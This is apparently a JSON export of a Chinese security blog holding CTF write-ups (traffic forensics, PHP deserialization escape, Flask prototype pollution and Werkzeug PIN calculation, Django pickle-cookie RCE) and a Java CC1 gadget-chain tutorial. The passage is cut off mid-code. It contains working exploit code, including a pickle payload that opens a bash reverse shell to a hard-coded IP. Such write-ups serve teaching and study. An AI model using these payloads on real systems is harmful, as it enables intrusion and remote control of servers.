\nSmallSword_3题目内容：攻击者下载到的flag是______________?(答案示例：flag3&#123;uuid&#125;)\n\nEWez_web_1题目内容：\n\n服务器自带的后门文件名是什么？（含文件后缀）\n\n\n\n追踪HTTP10062流，可以发现ViewMore.php写入了d00r.php文件\n\n因此自带的后门文件名为ViewMore.php\nez_web_2题目内容：服务器的内网IP是多少？\n\n寻找d00r.php文件，追踪HTTP10098流\n\n得到内网IP192.168.101.132\nez_web_3题目内容：攻击者往服务器中写入的key是什么？\n\n这里发现写入了内容\n\nBase64解码可以看出为压缩包格式\n\n打开压缩包\n\n需要密码，从上文可得到密码\n\n输入后得到key\n\nTPtcp_dump1题目内容：攻击者通过暴力破解进入了某Wiki 文档，请给出登录的用户名与密码，以:拼接，比如admin:admin\n\n\n\n之前穷举挨个看的，现在学习其他师傅的思路，语法如下\nhttp &amp;&amp; !http.request.uri contains \"login\" &amp;&amp; !tcp contains \"用户名或密码错误\" &amp;&amp; http.response.code !=404\n\n这里的话是筛除了login登录包和报错包以及返回404的包，剩下的就是一些无报错信息，且不是登录包的流量，而登录成功的那个包也肯定在这里，因此接下来找一下就好了\n\n跟进TCP流\n\n账密TMjpxFGQwD:123457\ntcp_dump2题目内容：攻击者发现软件存在越权漏洞，请给出攻击者越权使用的cookie的内容的md5值。（32位小写）\n\n\n\n\n注意到userid为2，再往下看\n\nuserid变为1了，将Cookie值内容进行md5加密\n383c74db4e32513daaa1eeb1726d7255\n\n所以此时就得到了flag\ntcp_dump3攻击使用jdbc漏洞读取了应用配置文件，给出配置中的数据库账号密码，以:拼接，比如root:123456\n\nTCP流追踪1601\n\n得到数据库账密zyplayer:1234567\ntcp_dump4题目内容：攻击者又使用了CVE漏洞攻击应用，执行系统命令，请给出此CVE编号以及远程EXP的文件名，使用:拼接，比如CVE-2020-19817:exp.so\n\n在TCP流中发现是postgresql\n\n百度一下它的RCE漏洞\n\n得到CVE编号为CVE-2022-21724,追踪下一个流量包\n\n发现文件名是custom.dtd.xml，因此flag为CVE-2022-21724:custom.dtd.xml\ntcp_dump5题目内容：给出攻击者获取系统权限后，下载的工具的名称，比如nmap\n\n跟踪TCP流1611\n\n发现内网扫描工具fscan\nHDhacked_1题目内容：admIn用户的密码是什么？\n\n发现加密的key和iv\n\n而后发现密码\n\n解密即可\n\nflagflag&#123;WelC0m5_TO_H3re&#125;\nhacked_2题目内容：app.config['SECRET_KEY']值为多少？\n\n\n用在线工具解码一下即可得到key\n\n所以key为ssti_flask_hsfvaldb\nhacked_3题目内容：flask网站由哪个用户启动？\n\nTCP76流\n\nCookie如下\n.eJwdx1EKwyAMANCrDEGiPz1Ar1KGZBi7gBpplH2Idy_d-3vTDKWrYiGzm2k5vZRUWeo2WsRObkLKeMKeuekoB4RwZvlg1hDg_S917lSeOhAFf0CTRvXp7ytYGPx2EUbnl7drWqqRk11m3cGmKw0.YpIQcw.J5vs8t8bAr0xDIxF6EqUAH2kkLE\n\n结合上文得到的密钥，用工具即可\n\n得到用户为red\nhacked_4题目内容：攻击者写入的内存马的路由名叫什么？（答案里不需要加/）\n\nTCP82流之前没被请求过，所以猜测是Index\n\n","slug":"陇剑杯","date":"2023-09-03T12:51:20.000Z","categories_index":"WEB知识","tags_index":"CTF","author_index":"quan9i"},{"id":"cb7c14b5ba1b8885cf6dda7d25b703e1","title":"JAVA CC链全系列分析","content":"\n  \n  \n    \n      \n      \n        Please Input quan9i's Password!\n      \n      \n        \n        \n      \n    \n  \n\n","slug":"CC2+CC4+CC5+CC7","date":"2023-08-31T16:51:30.000Z","categories_index":"JAVA","tags_index":"JAVA安全","author_index":"quan9i"},{"id":"a006d2fe2aa670ca7acf7929091f72ac","title":"巅峰极客及DASCTF7月赛复现","content":"巅峰极客unserialize复现环境\n访问www.zip可获取源码\n而后审计源码\n\n这里的话是传入了两个参数，然后将其赋值到一个类中，进行了序列化同时用了b函数进行处理，看一下有关类的\n\n这里可以看到能执行反序列化的只有pull_it类中的@eval($this-&gt;x)，因此我们需要控制的就是这个x了，然后我们接下来看刚刚的b函数是什么东西\n\n可以发现是替换数据的，看到这个，结合反序列化，这里应该是反序列化逃逸了，不过是字符逃逸增加还是减少呢，我们看的是反序列化前的函数\n\n这里发现是a函数，因此是反序列化字符串逃逸减少类型的，接下来看一下如何构造，首先给它随便赋值\n给它赋值为1和2，而后可得到数据\n\"O:7:\"push_it\":2:&#123;s:13:\"\\000push_it\\000root\";s:1:\"1\";s:12:\"\\000push_it\\000pwd\";s:1:\"2\";&#125;\"\n    // \\000这个是private变量序列化后自带的，其实就是个0，但在PHP中会把这认为是4个字母，所以需要改成0\n\"O:7:\"push_it\":2:&#123;s:13:\"0push_it0root\";s:1:\"1\";s:12:\"0push_it0pwd\";s:1:\"2\";&#125;\"\n\n&quot;;s:12:&quot;0push_it0pwd&quot;;s:1:&quot;2这部分共28个字符，所以我们这里构造14个bbbbbb即可实现逃逸，而后因为这里是两个变量，所以我们需要再自定义一个，因为剩下的还有&quot;;，所以我们需要补到变量上去，也就是说pwd开头必须是&quot;;s:6:&quot;quan9i&quot;这种格式(字符串必须用双引号包裹)，而后我们看执行命令的那个，我们这里需要构造无数字字母webshell，在这里我构造好的system(ls)，其异或结果是(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);，而后我们这里先对其进行URL解码，再对其进行序列化后进行URL编码，然后再将之前自定义的变量赋值给pwd即可，构造Poc如下\n&lt;?php\n\nclass pull_it &#123;\n\tprivate $x;\n\n\tfunction __construct($xx) &#123;\n\t\t$this->x = $xx;\n\t&#125;\n\n\tfunction __destruct() &#123;\n\t\tif ($this->x) &#123;\n\t\t\t$preg_match = 'return preg_match(\"/[A-Za-z0-9]+/i\", $this->x);';\n\t\tif (eval($preg_match)) &#123;\n\t\t\techo $preg_match;\n\t\t\texit(\"save_waf\");\n\t\t&#125;\n\t\t@eval($this->x);\n\t\t&#125;\n\t&#125;\t\n&#125;\nclass push_it &#123;\n\tprivate $root;\n\tprivate $pwd;\n\n\tfunction __construct($root, $pwd) &#123;\n\t\t$this->root = $root;\n\t\t$this->pwd = $pwd;\n\t&#125;\n\t\n\t\tfunction __destruct() &#123;\n\t\tunset($this->root);\n\t\tunset($this->pwd);\n\t&#125;\n\n\tfunction __toString() &#123;\n\t\tif (isset($this->root) &amp;&amp; isset($this->pwd)) &#123;\n\t\t\techo \"&lt;h1>Hello, $this->root&lt;/h1>\";\n\t\t&#125;\n\t\telse &#123;\n\t\t\techo \"&lt;h1>out!&lt;/h1>\";\n\t\t&#125;\n\t&#125;\n&#125;\n$pop= new pull_it(urldecode('(\"%08%02%08%08%05%0d\"^\"%7b%7b%7b%7c%60%60\")(\"%0c%08\"^\"%60%7b\");'));\n$pop= urlencode(serialize($pop));\necho '\";s:6:\"quan9i\";'.$pop;\n?>\n\n\n得到&quot;;s:6:&quot;quan9i&quot;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A31%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%0C%08%22%5E%22%60%7B%22%29%3B%22%3B%7D，此即为pwd变量，接下来进行赋值\n\n此时带着Cookie访问login.php\n\nDASCTF7月暑假赛EzFlask先不看源码，先来讲一下前置知识，这里开始的考察点为Python原型链污染，这里举个例子\ndef merge(src, dst):\n    # Recursive merge function\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\n我们通过__class__.__base__可以修改父类属性\nfrom utils import merge\n\n\nclass father:\n    secret = \"haha\"\n\nclass son_a(father):\n    pass\n\nclass son_b(father):\n    pass\n\n\ninstance = son_b()\npayload = &#123;\n    \"__class__\" : &#123;\n        \"__base__\" : &#123;\n            \"secret\" : \"no way\"\n        &#125;\n    &#125;\n&#125;\n\nprint(son_a.secret)\n#haha\nprint(instance.secret)\n#haha\nmerge(payload, instance)\nprint(son_a.secret)\n#no way\nprint(instance.secret)\n#no way\n\n接下来再看这道题，访问后得源码\nimport uuid\n\nfrom flask import Flask, request, session\nfrom secret import black_list\nimport json\n\napp = Flask(__name__)\napp.secret_key = str(uuid.uuid4())\n\ndef check(data):\n    for i in black_list:\n        if i in data:\n            return False\n    return True\n\ndef merge(src, dst):\n    for k, v in src.items():\n        if hasattr(dst, '__getitem__'):\n            if dst.get(k) and type(v) == dict:\n                merge(v, dst.get(k))\n            else:\n                dst[k] = v\n        elif hasattr(dst, k) and type(v) == dict:\n            merge(v, getattr(dst, k))\n        else:\n            setattr(dst, k, v)\n\nclass user():\n    def __init__(self):\n        self.username = \"\"\n        self.password = \"\"\n        pass\n    def check(self, data):\n        if self.username == data['username'] and self.password == data['password']:\n            return True\n        return False\n\nUsers = []\n\n@app.route('/register',methods=['POST'])\ndef register():\n    if request.data:\n        try:\n            if not check(request.data):\n                return \"Register Failed\"\n            data = json.loads(request.data)\n            if \"username\" not in data or \"password\" not in data:\n                return \"Register Failed\"\n            User = user()\n            merge(data, User)\n            Users.append(User)\n        except Exception:\n            return \"Register Failed\"\n        return \"Register Success\"\n    else:\n        return \"Register Failed\"\n\n@app.route('/login',methods=['POST'])\ndef login():\n    if request.data:\n        try:\n            data = json.loads(request.data)\n            if \"username\" not in data or \"password\" not in data:\n                return \"Login Failed\"\n            for user in Users:\n                if user.check(data):\n                    session[\"username\"] = data[\"username\"]\n                    return \"Login Success\"\n        except Exception:\n            return \"Login Failed\"\n    return \"Login Failed\"\n\n@app.route('/',methods=['GET'])\ndef index():\n    return open(__file__, \"r\").read()\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=5010)\n\n明显的Python原型链污染，接下来进行污染即可\n&#123;\n\n\"username\":\"a\",\n\"password\":\"b\",\n\"check\" : &#123;\n            \"__globals__\" : &#123;\n                \"__file__\":\"secret.py\"\n            &#125;\n    &#125;\n&#125;\n\n\n发现过滤了几个关键字\n\n读取flag发现没有\n\n但出现了PIN码，尝试算PIN码实现RCE，这里我们需要知道PIN码生成的六个要素\npin码生成要六要素\n1.username 在可以任意文件读的条件下读 /etc/passwd进行猜测\n2.modname 默认flask.app\n3.appname 默认Flask\n4.moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量\n5.uuidnode mac地址的十进制,任意文件读 /sys/class/net/eth0/address\n6.machine_id \n\n对于用户名，我们这里可以读取/proc/self/status，发现Uid为0，说明是root用户\n\n而后对于2和3无需更改，接下来第四个moddir flask，我们在上面的报错中，可以看出是/usr/local/lib/python3.10/site-packages/flask/app.py，接下来看第五个uuidnode mac，读取/sys/class/net/eth0/address，读取后得到4e:a8:f5:c0:49:db,而后转为十进制\n>>> int('4ea8f5c049db',16)\n86487584491995\n\n得到86487584491995，接下来看最后一个machine_id，它的话是在/usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py文件中看get_machine_id()函数来获取的，这里需要对__init__进行绕过，使用Unicode编码即可\n&#123;\n\n\"username\":\"a\",\n\"password\":\"b\",\n\"check\" : &#123;\n            \"__globals__\" : &#123;\n                \"__file__\":\"/usr/local/lib/python3.10/site-packages/werkzeug/debug/__init\\u005f_.py\"\n            &#125;\n    &#125;\n&#125;\n\n\n\n\n可以知道/etc/machine-id和/proc/sys/kernel/random/boot_id只要读取到其中一个就可以，然后继续拼接上/proc/self/cgroup中以/结尾的最后一部分即可，我们这里读取/etc/machine-id获取到96cec10d3d9307792745ec3b85c89620,读取/proc/self/cgroup获取到docker-78749d687627348213d5c1e617c2ffa8b39183112e700935cf8ecaadb39c9855.scope\n\n因此最后一部分值为96cec10d3d9307792745ec3b85c89620docker-78749d687627348213d5c1e617c2ffa8b39183112e700935cf8ecaadb39c9855.scope\n接下来运行脚本\nimport hashlib\nfrom itertools import chain\nprobably_public_bits &#x3D; [\n    &#39;root&#39;,\n    &#39;flask.app&#39;,\n    &#39;Flask&#39;,\n    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.10&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; \n]\n\nprivate_bits &#x3D; [\n    &#39;86487584491995&#39;,\n    &#39;96cec10d3d9307792745ec3b85c89620docker-78749d687627348213d5c1e617c2ffa8b39183112e700935cf8ecaadb39c9855.scope&#39;# get_machine_id(), &#x2F;etc&#x2F;machine-id  &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id\n]   \n\nh &#x3D; hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit &#x3D; bit.encode(&quot;utf-8&quot;)\n    h.update(bit)\nh.update(b&quot;cookiesalt&quot;)\n\ncookie_name &#x3D; f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;\n\n# If we need to generate a pin we salt it a bit more so that we don&#39;t\n# end up with the same value and generate out 9 digits\nnum &#x3D; None\nif num is None:\n    h.update(b&quot;pinsalt&quot;)\n    num &#x3D; f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]\n\n# Format the pincode in groups of digits for easier remembering if\n# we don&#39;t have a result yet.\nrv &#x3D; None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size &#x3D;&#x3D; 0:\n            rv &#x3D; &quot;-&quot;.join(\n                num[x : x + group_size].rjust(group_size, &quot;0&quot;)\n                for x in range(0, len(num), group_size)\n            )\n            break\n    else:\n        rv &#x3D; num\n\nprint(rv)\n\n\n得到PIN码\n\n访问console，输入PIN码\n\n执行命令即得flag\nezcms进入后发现环境为XHCMS，之前审计过，知道有SQL注入，然后傻呆呆的查了半天，发现数据库里没藏flag，然后想起来文件包含漏洞，这里它还会拼接.php后缀\n\n因此如果能够实现上传1.jpg，再用多个.....来突破最大长度限制，实现后缀失效，继而使得文件变成1.php，但发现不能上传文件\n\n因此只能另想它法，后来想到文件包含中的pear文件包含可以RCE，因此进行了尝试，找了找默认路径，最后成功打入\n\n而后访问文件，执行命令即可\n\nezpy给了附近，在settings.py中发现\nROOT_URLCONF = 'openlug.urls'\n# for database performance\nSESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'\n# use PickleSerializer\nSESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'\nSECRET_KEY = 'p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn'\n\n\nPickleSerializer联想到Pickle反序列化\nDjango反序列化在Python\\Lib\\site-packages\\django\\core\\signing.py，源码如下\ndef dumps(obj, key&#x3D;None, salt&#x3D;&#39;django.core.signing&#39;, serializer&#x3D;JSONSerializer, compress&#x3D;False):\n    is_compressed &#x3D; False\n\n    if compress:\n        compressed &#x3D; zlib.compress(data)\n        if len(compressed) &lt; (len(data) - 1):\n            data &#x3D; compressed\n            is_compressed &#x3D; True\n    base64d &#x3D; b64_encode(data).decode()\n    if is_compressed:\n        base64d &#x3D; &#39;.&#39; + base64d\n    return TimestampSigner(key, salt&#x3D;salt).sign(base64d)\n\n虽然要求是JSONSerializer，不过这里用pickle也无妨\n其具体位置在Python\\Lib\\site-packages\\django\\contrib\\sessions\\serializers.py\nclass PickleSerializer(object):\n    \"\"\"\n    Simple wrapper around pickle to be used in signing.dumps and\n    signing.loads.\n    \"\"\"\n    def dumps(self, obj):\n        return pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)\n\n    def loads(self, data):\n        return pickle.loads(data)\n\n最终Exp如下\n# coding: utf-8\nimport pickle\nimport django.core.signing\nimport subprocess\nimport base64\n\nclass PickleSerializer(object):\n    \"\"\"\n    Simple wrapper around pickle to be used in signing.dumps and\n    signing.loads.\n    \"\"\"\n    def dumps(self, obj):\n        return pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)\n\n    def loads(self, data):\n        return pickle.loads(data)\n\nclass CreateTmpFile(object):\n    def __reduce__(self):\n        import subprocess\n        return (subprocess.Popen,\n                (('bash -c \"bash -i >&amp; /dev/tcp/115.236.153.177/21698 &lt;&amp;1\"',),-1,None,None,None,None,None,False, True))\n\n\nscookie = django.core.signing.dumps(\n    obj=CreateTmpFile(),\n    key='p(^*@36nw13xtb23vu%x)2wp-vk)ggje^sobx+*w2zd^ae8qnn',\n    salt='django.contrib.sessions.backends.signed_cookies',\n    serializer=PickleSerializer)\nprint(scookie)\n\n而后在登录处会用到session，因此在Cookie处给其赋值Sessionid即可\n","slug":"巅峰极客及DASCTF7月赛复现","date":"2023-07-22T15:51:20.000Z","categories_index":"WEB知识","tags_index":"CTF","author_index":"quan9i"},{"id":"e454c72b82fecd0309833abef7aa2d95","title":"JAVA CC1分析","content":"前言JAVA安全初级入门者，学习一下CC链加强代码审计能力。\n开始之前，先简单引入一些概念知识。\n什么是CommonsCollections，这里引用一段话进行解释\nCommons：Apache Commons是Apache软件基金会的项目，Commons的目的是提供可重用的解决各种实际问题的Java开源代码。\n\nCommons Collections：Java中有一个Collections包，内部封装了许多方法用来对集合进行处理，CommonsCollections则是对Collections进行了补充，完善了更多对集合处理的方法，大大提高了性能。\n\n环境搭建这里的CC1链，使用的JDK环境为JDK8u65，JDK下载链接如下\nhttps://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html\n可以放入虚拟机而后拷贝到宿主机进行使用，拷贝的具体路径为C:\\Program Files\\Java\\jdk1.8.0_65,而后在IDEA中，新建项目时选择对应JDK版本即可\n\n建立好项目后，我们会发现一些代码，例如在sun包下的代码是.class文件，它的代码是直接反编译出来的，这种不可用来寻找调用同名函数，而且代码难以读懂，因此我们需要提前对其进行配置，我们需要下载其对应java文件至JDK中，具体方法如下\n首先下载有漏洞的版本，链接如下\nhttp://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4\n而后点击左侧的zip即可下载压缩包\n\n下载完成后，我们回到之前下载中的JDK8U65文件夹中\n\n这里的src.zip为压缩包，我们将其解压在此文件夹下，而后，我们去刚刚下载的zip文件中找到sun包，具体路径为jdk-af660750b2f4\\\\jdk-af660750b2f4\\\\src\\\\share\\\\classes，而后将其解压到在这个src目录下\n\n接下来在IDEA中选择Project Structure\n\n选择SDKs，并在Sourcepath下添加src包\n\n此时就大功告成了，可以开始分析CC链了。\nCC1攻击链这里CC1链中的漏洞点是InvolveTransform的Transform方法，跟进查看\n\n这里可以发现当输入不为空时，就会调用反射获取输入参数的类，而后获取根据两个参数获取此类的某个方法，我们跟进这两个参数\n\n这里可以发现是InvokerTransformer方法内的两个参数，然后继续看上一个方法\n，这里是**method.invoke(input, iArgs);**，也就是说可以直接执行了输入的方法，并将InvokerTransformer的参数值赋值到了这里。\n显而易见，这是一个完整的反射流程，我们可以尝试触发命令执行。\n正常执行命令的操作如下\nRuntime.getRuntime().exec(\"calc\");\n\n调用反射时如下\nRuntime r = Runtime.getRuntime();\n        Class c = Runtime.class;\n        Method execMethod = c.getMethod(\"exec\", String.class);\n        execMethod.invoke(r,\"calc\");\n\n这里简单改写下，改写为该类触发的形式\n首先看一下，InvokerTransformer调用的第一个参数是String类的方法名，我们这里的方法名，自然是exec，因此第一个参数就有了，如下\nInvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\");\n\n接下来看第二个参数，第二个参数的类型是Class数组类型的参数类型，我们这里的exec是字符串，所以就是String，所以第二个参数也有了，如下\nInvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",Class[]&#123;String.class&#125;);\n\n接下来看第三个参数，第三个参数的类型是Object数组类型的参数值，我们这里要执行的命令是calc，所以就直接写calc就可以啦，因此三个参数就构造好了，具体如下\nInvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",Class[]&#123;String.class&#125;,Object[]&#123;\"calc\"&#125;);\n\n这时三个参数构造好了，我们想要触发反射，还需要调用它的transform方法，这个方法需要一个参数来获取它的类，具体语句是这个\nClass cls = input.getClass();\n\n我们这里，根据正常反射情况下，可以看出调用的类是Runtime类，所以这里需要的就是Runtime类，根据反射获取类的话，有一种方法是已知类中的某个静态变量或其他，通过x.getClass()可以获取类，我们这里的话跟进Runtime类看一下\n\n可以发现getRuntime是公共静态方法，这也是我们前文中讲正常反射为什么要用它来获取类的原因，因此我们这里的话也仍旧用这个来获取Runtime类，因此这里input的内容就是Runtime.getRuntime()，所以这里构造语句如下\ntransform(Runtime.getRuntime())\n\n将这两个语句进行合并\nInvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;);\ninvokerTransformer.transform(Runtime.getRuntime());\n\n\n可以发现此时是可以成功执行命令的，因此接下来接着往上找，我们要找一个方法调用这个transform方法的，最好是不重名的，因为我们最后的话可以走到ReadObject方法的，这样才能实现命令执行。\n这里该怎么去寻找调用transform方法的呢，很简单，只需要我们选中这个方法，然后点击右键，选择Find Usages\n\n此时即可在下方发现调用transform方法的函数\n\n这里我们注意到TransformMap类，跟进查看一下相关代码，而后发现代码如下\nprotected Object checkSetValue(Object value) &#123;\n    return valueTransformer.transform(value);\n&#125;\n\n这里发现调用了transform，如果可以控制valueTransformer，就可以实现刚刚的命令执行，因此我们看这个valueTransformer是从哪里来的，跟进查看\npublic static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;\n    return new TransformedMap(map, keyTransformer, valueTransformer);\n&#125;\nprotected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;\n    super(map);\n    this.keyTransformer = keyTransformer;\n    this.valueTransformer = valueTransformer;\n&#125;\n\nTransformedMap构造方法为protected方法，因此提供了一个静态方法decorate来调用它的构造方法，decorate接收的参数为一个Map和两个Transformer，并对两个Transformer参数进行修饰。\n此时我们就找到了控制了valueTransformer的方法，现在只需要两步，即可实现刚刚的命令执行\n1、将valueTransformer改写为new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;)\n2、将transform内的参数改写为Runtime.getRuntime()\n\n首先来看第一步，第一步的实现的话，我们只需要向decorate内传入一个Map，控制第三个参数为new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)即可，因此我们这里构造语句如下\nInvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;);\n         HashMap map = new HashMap();\n         TransformedMap.decorate(map,null,invokerTransformer);\n\n此时第一步就实现完成了，然后来到第二步，我们该如何控制value的值为Runtime.getRuntime()呢，这个checkSetValue是protected方法，我们是无法直接调用的，因此我们这里查看其他方法谁调用了这个方法，进而实现控制此值，选中checkSetValue，右键点击Find Usages，查看哪里调用了此方法，而后来到了AbstractInputCheckedMapDecorator的MapEntry类，查看它的setValue方法\n\n并且这里注意到TransformedMap类是AbstractInputCheckedMapDecorator的继承类\n\n该类的具体方法如下\nstatic class MapEntry extends AbstractMapEntryDecorator &#123;\n\n     /** The parent map */\n     private final AbstractInputCheckedMapDecorator parent;\n\n     protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;\n         super(entry);\n         this.parent = parent;\n     &#125;\n\n     public Object setValue(Object value) &#123;\n         value = parent.checkSetValue(value);\n         return entry.setValue(value);\n     &#125;\n &#125;\n\n这里不难发现我们可以通过控制setValue的方法就可以实现控制checkValue，因此我们这里需要一个entry来调用它的setValue方法，所以这里遍历一个Map，获取它的entry，具体如下\nmap.put(\"key\",\"value\");\nfor (Map.Entry entry:transformedMap.entrySet())\n       &#123;\n               entry.setValue(Runtime.getRuntime());\n       &#125;\n\n此时结合上一个语句，简单改写一下，最终编写整体语句如下\nInvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;);\nHashMap map = new HashMap();\nMap&lt;Object,Object> transformedMap =TransformedMap.decorate(map,null,invokerTransformer);\nmap.put(\"key\",\"value\");//随便给map存一对值 否则遍历时map为空 拿不到entry\nfor (Map.Entry entry:transformedMap.entrySet())\n&#123;\n    entry.setValue(Runtime.getRuntime());\n&#125;\n\n\n此时成功执行命令，接下来继续往下走，因为我们的最终目标是找到ReadObject方法，此时发现有一个类调用了readObject方法，跟进\n\n这里发现它正好有entry的遍历功能，所以我们现在就可以通过这个直接拿entry了。\n\n部分代码如下\n    AnnotationInvocationHandler(Class&lt;? extends Annotation> type, Map&lt;String, Object> memberValues) &#123;\n        Class&lt;?>[] superInterfaces = type.getInterfaces();\n        if (!type.isAnnotation() ||\n            superInterfaces.length != 1 ||\n            superInterfaces[0] != java.lang.annotation.Annotation.class)\n            throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\");\n        this.type = type;\n        this.memberValues = memberValues;\n    &#125;\nprivate void readObject(java.io.ObjectInputStream s)\n        throws java.io.IOException, ClassNotFoundException &#123;\n        s.defaultReadObject();\n\n        // Check to make sure that types have not evolved incompatibly\n\n        AnnotationType annotationType = null;\n        try &#123;\n            annotationType = AnnotationType.getInstance(type);\n        &#125; catch(IllegalArgumentException e) &#123;\n            // Class is no longer an annotation type; time to punch out\n            throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");\n        &#125;\n\n        Map&lt;String, Class&lt;?>> memberTypes = annotationType.memberTypes();\n\n        // If there are annotation members without values, that\n        // situation is handled by the invoke method.\n        for (Map.Entry&lt;String, Object> memberValue : memberValues.entrySet()) &#123;\n            String name = memberValue.getKey();\n            Class&lt;?> memberType = memberTypes.get(name);\n            if (memberType != null) &#123;  // i.e. member still exists\n                Object value = memberValue.getValue();\n                if (!(memberType.isInstance(value) ||\n                      value instanceof ExceptionProxy)) &#123;\n                    memberValue.setValue(\n                        new AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + \"[\" + value + \"]\").setMember(\n                                annotationType.members().get(name)));\n                &#125;\n            &#125;\n        &#125;\n\n这个方法并不是public方法，所以我们想调用它这个类，需要通过包名来进行调用\nClass AnnotationInvocationHandler = Class.forname(sun.reflect.annotation.AnnotationInvocationHandler)\n\n而后我们可以发现这里的构造参数也不是public的，因此也需要通过反射来进行获取，使用的方法是getConstructor，具体如下\nConstructor AnnotartionConstructer = AnnotationInvocationHandler.getConstructor(Class.class,Map.class);\n\n接下来我们还需要用setAccessible给它设置特权模式，有了这个才能执行非public方法，语句如下\nannotationInvocationHandlerconstructor.setAccessible(true); \n\n接下来就可以实例化对象了，但这里要如何赋值呢，我们看源代码可以发现第一个参数为Class&lt;? extends Annotation&gt; type，这个其实是注解的意思，我们平常写的Override就是其中一种，这里暂时写他，第二个是Map，我们用前文写好的即可，代码如下\nObject o = AnnotartionConstructer.newInstance(Override.class,transformedMap);\n\n此时和前文语句相组合，得到代码如下\nInvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"calc\"&#125;);\n        HashMap map = new HashMap();\n        Map&lt;Object,Object> transformedMap =TransformedMap.decorate(map,null,invokerTransformer);\n        map.put(\"key\",\"value\");\n        Class AnnotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor AnnotartionConstructer = AnnotationInvocationHandler.getConstructor(Class.class,Map.class);\n        AnnotartionConstructer.setAccessible(true);\n        Object o = AnnotartionConstructer.newInstance(Override.class,transformedMap);\n        Serialize(o);\n        unserialize(\"ser.bin\");\n\n三个Bug但此时出现了三个问题\n1、Runtime.getRuntime()这个是我们通过Runtime对象实现的，但Runtime对象没有继承Serializable\n2、if (memberType != null) &#123;  // i.e. member still exists\n                Object value = memberValue.getValue();\n                if (!(memberType.isInstance(value) ||\n                      value instanceof ExceptionProxy)) &#123;\n                    memberValue.setValue(\n在执行SetValue方法前，还有两个if语句，该如何进行绕过。\n3、memberValue.setValue(\n                        new AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + \"[\" + value + \"]\").setMember(\n                                annotationType.members().get(name)));\n这里传入的参数应该是Runtime.getRuntime()，但这个方法内的参数值我们不确定能不能控制\n\n\n首先来看第一个问题，虽然Runtime对象没有继承Serializable，但是它的Class类，即Runtime.class是可以进行序列化的，因此我们这里用它来代替Runtime，然后用反射调用exec和getRuntime方法，再用invoke执行即可，具体代码如下\nClass c = Runtime.class;\n       Method getRuntime = c.getMethod(\"getRuntime\");\n       Method execMethod = c.getMethod(\"exec\", String.class);\n       execMethod.invoke(getRuntime.invoke(null,null),\"calc\");\n\n第一个问题此时已经解决一半，接下来我们用一开始调用的方式，即用InvokerTransformer来调用这里的getRuntime方法，代码如下\nMethod getRuntime = (Method) new InvokerTransformer(\"getMethod\",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\",null&#125;).transform(Runtime.class);\n\n此时已经成功获取了getRuntime方法，接下来调用invoke方法执行此方法。\nRuntime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\",new Class[]&#123;Object.class,Object.class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntime);\n\n此时再写一个反弹计算器的代码即可实现命令执行，此时我们发现这个调用链是一个首尾相连的结构，即下一个调用的是上一个的transform\nMethod getRuntime =(Method) new InvokerTransformer(\"getMethod\",new Class[]&#123;String.class,String.class&#125;,new Object[]&#123;\"getRuntime\",null&#125;).transform(Runtime.class);\n        Runtime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntime);\n        new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new 